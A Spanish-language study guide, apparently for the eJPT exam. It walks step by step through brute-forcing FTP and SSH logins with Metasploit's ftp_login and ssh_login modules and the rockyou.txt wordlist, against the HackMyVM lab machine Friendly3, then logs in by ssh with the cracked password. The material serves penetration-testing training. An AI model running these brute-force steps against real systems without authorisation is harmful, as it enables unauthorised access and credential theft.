
----
- TAG: #Ataques #Fuerza-Bruta #Metasploit 
---
# Ataques de Fuerza Bruta con Metasploit para SSH y FTP

En este apartado, aprenderemos a realizar ataques de fuerza bruta utilizando **Metasploit** para los protocolos **ssh** y **ftp**. Utilizaremos la máquina **Friendly3** de **HackMyVM** para practicar estos ataques.

## Preparativos

1. Importamos y arrancamos la máquina **Friendly3** de [HackMyVM](https://hackmyvm.eu/machines/?v=friendly3).
2. Desde nuestra máquina **Kali Linux**, localizamos la máquina víctima utilizando `arp-scan`:
    ```bash
    arp-scan -I wlan0 --localnet
    ```
3. Realizamos un escaneo de puertos con **nmap** para identificar los puertos abiertos:
    ```bash
    nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 1.2.3.4
    ```
4. Al finalizar el escaneo, observamos que los puertos 21 y 22 están abiertos.

## Ataque de Fuerza Bruta al Protocolo FTP

1. Abrimos **Metasploit**:
    ```bash
    msfconsole
    ```
2. Utilizamos la función `search` para buscar módulos relacionados con **ftp_login**:
    ```bash
    search ftp_login
    ```
3. Seleccionamos el módulo encontrado (por ejemplo, `use auxiliary/scanner/ftp/ftp_login`):
    ```bash
    use 0
    ```
4. Mostramos las opciones de configuración:
    ```bash
    show options
    ```
5. Configuramos los parámetros necesarios:
    - **PASS_FILE**: Le pasamos el directorio del archivo `rockyou.txt`:
        ```bash
        set PASS_FILE /usr/share/wordlists/rockyou.txt
        ```
    - **USERNAME**: Especificamos el usuario que conocemos (en este caso, `juan`):
        ```bash
        set USERNAME juan
        ```
    - **RHOSTS**: Configuramos la IP de la máquina objetivo:
        ```bash
        set RHOSTS 1.2.3.4
        ```
6. Verificamos las opciones configuradas:
    ```bash
    show options
    ```
7. Ejecutamos el módulo para iniciar el ataque de fuerza bruta:
    ```bash
    run
    ```

Después de un tiempo, Metasploit nos mostrará la combinación de usuario y contraseña encontrada, por ejemplo:
- Usuario: `juan`
- Contraseña: `alexis`

## Ataque de Fuerza Bruta al Protocolo SSH

1. En Metasploit, buscamos módulos relacionados con **ssh_login**:
    ```bash
    search ssh_login
    ```
2. Seleccionamos el módulo encontrado (por ejemplo, `use auxiliary/scanner/ssh/ssh_login`):
    ```bash
    use 0
    ```
3. Configuramos los parámetros necesarios de manera similar al ataque FTP:
    - **USERNAME**: Especificamos el usuario `juan`:
        ```bash
        set USERNAME juan
        ```
    - **PASS_FILE**: Le pasamos el directorio del archivo `rockyou.txt`:
        ```bash
        set PASS_FILE /usr/share/wordlists/rockyou.txt
        ```
    - **RHOSTS**: Configuramos la IP de la máquina objetivo:
        ```bash
        set RHOSTS 1.2.3.4
        ```
4. Verificamos las opciones configuradas:
    ```bash
    show options
    ```
5. Ejecutamos el módulo para iniciar el ataque de fuerza bruta:
    ```bash
    run
    ```

Una vez obtenida la combinación correcta de usuario y contraseña, podemos acceder al sistema utilizando **ssh**:
```bash
ssh juan@1.2.3.4
```

## Resumen de Pasos

1. **Preparativos**:
    - Importar y arrancar la máquina **Friendly3**.
    - Localizar la máquina víctima con `arp-scan`.
    - Realizar un escaneo de puertos con **nmap**.

2. **Ataque FTP**:
    - Buscar y seleccionar el módulo `ftp_login` en Metasploit.
    - Configurar `PASS_FILE`, `USERNAME`, y `RHOSTS`.
    - Ejecutar el módulo.

3. **Ataque SSH**:
    - Buscar y seleccionar el módulo `ssh_login` en Metasploit.
    - Configurar `PASS_FILE`, `USERNAME`, y `RHOSTS`.
    - Ejecutar el módulo.
    - Acceder al sistema con **ssh**.

Con estos pasos, podrás realizar ataques de fuerza bruta a los protocolos **ssh** y **ftp** utilizando **Metasploit**, lo cual es una habilidad esencial para el examen **eJPT**. ¡Buena suerte!